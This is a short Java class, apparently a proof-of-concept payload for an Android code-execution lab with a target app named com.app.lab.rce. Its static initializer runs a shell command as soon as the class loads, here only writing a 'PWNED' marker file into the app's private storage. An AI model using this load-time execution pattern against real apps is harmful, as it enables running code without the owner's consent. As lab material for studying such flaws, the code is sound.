package pwn;

import android.util.Log;

public class Shell {
    static {
        Log.e("RCE", "💥 STATIC INITIALIZER EJECUTADO");

        try {
            String cmd =
                    "sh -c 'echo PWNED $(date) > /data/data/com.app.lab.rce/files/pwned.txt'";
            Runtime.getRuntime().exec(cmd).waitFor();
        } catch (Exception e) {
            Log.e("RCE", "Error: " + e.getMessage());
        }
    }
}
